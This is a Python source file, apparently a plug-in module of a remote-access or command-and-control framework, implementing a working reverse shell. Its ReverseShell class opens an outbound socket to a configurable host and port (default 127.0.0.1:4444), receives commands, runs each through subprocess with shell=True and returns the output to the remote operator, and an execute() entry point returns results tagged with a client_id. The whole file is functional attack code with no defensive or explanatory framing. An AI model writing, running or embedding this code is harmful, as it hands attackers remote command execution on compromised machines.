import os
import socket
import subprocess
import time


class ReverseShell:
    def __init__(self, host, port, timeout=300):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket = None
        self.active = False
        self.commands = []
        self.start_time = None
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((self.host, self.port))
            self.active = True
            self.start_time = time.time()
            return True
        except:
            return False
    
    def execute_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout + result.stderr or "Command executed (no output)"
        except:
            return "Error"
    
    def send(self, data):
        if self.socket and self.active:
            try:
                self.socket.sendall(data.encode() + b"\n")
            except:
                self.active = False
    
    def receive(self):
        if not self.socket or not self.active:
            return None
        try:
            self.socket.settimeout(1)
            data = self.socket.recv(4096)
            return data.decode().strip() if data else None
        except:
            return None
    
    def run(self):
        if not self.connect():
            return {"module": "reverse_shell_module", "status": "failed", "error": "Connection failed"}
        
        self.send("Reverse shell connected\n")
        
        while self.active:
            if self.start_time and (time.time() - self.start_time) > self.timeout:
                break
            
            cmd = self.receive()
            if cmd:
                if cmd.lower() in ["exit", "quit"]:
                    break
                self.commands.append(cmd)
                self.send(self.execute_command(cmd))
            
            time.sleep(0.1)
        
        if self.socket:
            self.socket.close()
        
        return {
            "module": "reverse_shell_module",
            "status": "completed",
            "duration": time.time() - self.start_time if self.start_time else 0,
            "commands_executed": len(self.commands),
            "command_list": self.commands[:10]
        }


def execute(config, client_id):
    host = config.get("host", "127.0.0.1")
    port = config.get("port", 4444)
    timeout = config.get("timeout", 300)
    
    shell = ReverseShell(host, port, timeout)
    result = shell.run()
    result["client_id"] = client_id
    result["target_host"] = host
    result["target_port"] = port
    return result
